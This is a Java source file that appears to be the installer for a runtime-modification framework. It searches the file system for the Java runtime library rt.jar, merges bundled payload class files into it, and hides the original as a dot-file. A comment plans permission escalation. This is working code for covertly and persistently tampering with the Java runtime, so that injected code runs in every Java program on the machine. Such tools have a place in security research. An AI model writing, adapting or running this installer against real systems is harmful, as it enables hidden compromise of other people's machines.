import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.Scanner;
import java.util.jar.JarException;

import jreframeworker.engine.Engine;

// TODO: Going to need to escalate permissions, see https://github.com/rritoch/super-user-application
public class Main {

	private static final boolean VERBOSE = true;
	
	// jar contents
	private static final String CONFIG_FILE = "config";
	private static final String PAYLOAD_DIRECTORY = "payloads";
	
	// configuration keys
	private static final String MERGE_RENAME_PREFIX = "merge-rename-prefix";
	private static final String RUNTIME = "runtime";
	private static final String CLASS_FILE = "class";
	
	public static final String[] JVM_LOCATIONS = {
		// Linux
		"/usr/java/",
		// OSX
		"/Library/Java/",
		"/System/Library/Frameworks/JavaVM.framework/",
		"/usr/libexec/java_home/",
		// Windows
		"C:\\Program Files\\Java\\",
		"C:\\Program Files (x86)\\Java\\",
		"C:\\Windows\\System32\\Java\\",
		"C:\\Windows\\SysWOW64\\Java\\"
	};
	
	@SuppressWarnings("unchecked")
	public static void main(String[] args){
		
		// load configurations
		HashMap<String,Object> configurations = new HashMap<String,Object>();
		InputStream configStream = Main.class.getResourceAsStream(CONFIG_FILE);
		Scanner scanner = new Scanner(configStream);
		while(scanner.hasNextLine()){
			try {
				String[] entry = scanner.nextLine().split(",");
				if(entry[0].equals(CLASS_FILE)){
					if(configurations.containsKey(CLASS_FILE)){
						((ArrayList<String>) configurations.get(CLASS_FILE)).add(entry[1]);
					} else {
						ArrayList<String> classFiles = new ArrayList<String>();
						classFiles.add(entry[1]);
						configurations.put(CLASS_FILE, classFiles);
					}
				} else if(entry[0].equals(RUNTIME)){
					if(configurations.containsKey(RUNTIME)){
						((LinkedList<File>) configurations.get(RUNTIME)).add(new File(entry[1]));
					} else {
						LinkedList<File> runtimes = new LinkedList<File>();
						runtimes.add(new File(entry[1]));
						configurations.put(RUNTIME, runtimes);
					}
				} else {
					configurations.put(entry[0], entry[1]);
				}
			} catch (Exception e){
				// invalid configuration, skipping
			}
		}
		scanner.close();
		
		// load class payloads
		ArrayList<String> classFiles = ((ArrayList<String>) configurations.get(CLASS_FILE));
		byte[][] payloads = new byte[classFiles.size()][];
		for(int i=0; i<classFiles.size(); i++){
			String classFile = classFiles.get(i);
			try {
				InputStream classFileStream = Main.class.getResourceAsStream(PAYLOAD_DIRECTORY + "/" + classFile);
				byte[] payloadBytes = getBytes(classFileStream);
				payloads[i] = payloadBytes;
			} catch (Exception e) {
				if(VERBOSE) System.err.println("Could not load: " + PAYLOAD_DIRECTORY + "/" + classFile);
				if(VERBOSE) e.printStackTrace();
			}
		}
		
		if(VERBOSE) System.out.println(configurations);
		if(VERBOSE) System.out.println(classFiles);
		
		// rework runtimes
		LinkedList<File> runtimes = new LinkedList<File>();
		for(File runtime : !runtimes.isEmpty() ? runtimes : getRuntimes()){
			try {
				modifyRuntime(runtime, configurations.get(MERGE_RENAME_PREFIX).toString(), payloads);
				if(VERBOSE) System.out.println("Modified: " + runtime.getAbsolutePath());
			} catch (Exception e) {
				if(VERBOSE) System.err.println("Could not modify runtime: " + runtime.getAbsolutePath());
				if(VERBOSE) e.printStackTrace();
			}
		}
		if(VERBOSE) System.out.println("Finished.");
	}
	
	private static byte[] getBytes(InputStream is) throws IOException {
		int len;
		int size = 1024;
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] buffer = new byte[size];
		while ((len = is.read(buffer, 0, size)) != -1) {
			bos.write(buffer, 0, len);
		}
		return bos.toByteArray();
	}
	
	private static HashSet<String> getRuntimeNames(){
		HashSet<String> names = new HashSet<String>();
		names.add("rt.jar");
		return names;
	}
	
	private static LinkedList<File> getRuntimes(){
		if(VERBOSE) System.out.println("Searching for runtimes...");
		HashSet<String> runtimeNames = getRuntimeNames();
		LinkedList<File> runtimes = new LinkedList<File>();
		
		// establish a set of directories to search for runtimes
		LinkedList<File> searchDirectories = new LinkedList<File>();

		// look for known jvm locations
		for(String path : JVM_LOCATIONS){
			File location = new File(path);
			if(location.exists()){
				searchDirectories.add(location);
			}
		}
		
		// search each directory for runtimes
		for(File searchDirectory : searchDirectories){
			runtimes.addAll(search(searchDirectory, runtimeNames));
		}
		
		// unknown location, expand search to entire file system
		if(runtimes.isEmpty()){
			for(File rootDirectory : File.listRoots()){
				runtimes.addAll(search(rootDirectory, runtimeNames));
			}	
		}

		return runtimes;
	}
	
	private static LinkedList<File> search(File directory, HashSet<String> fileNames){
		LinkedList<File> results = new LinkedList<File>();
		search(directory, fileNames, results);
		return results;
	}
	
	private static void search(File directory, HashSet<String> fileNames, LinkedList<File> results) {
		File[] files = directory.listFiles();
		if(files != null){
			for(File file : files) {
				if(file.isDirectory()) {
					search(file, fileNames, results);
				} else if(fileNames.contains(file.getName())) {
					results.add(file);
				}
			}
		}
	}
	
	private static void modifyRuntime(File runtime, String mergeRenamePrefix, byte[]... classFiles) throws JarException, IOException {
		Engine engine = new Engine(runtime, mergeRenamePrefix);
		for(byte[] classFile : classFiles){
			engine.process(classFile);
		}
		// just hide the original runtime
		runtime.renameTo(new File(runtime.getParentFile().getAbsolutePath() + File.separatorChar + "." + runtime.getName()));
		engine.save(runtime);
	}
	
}
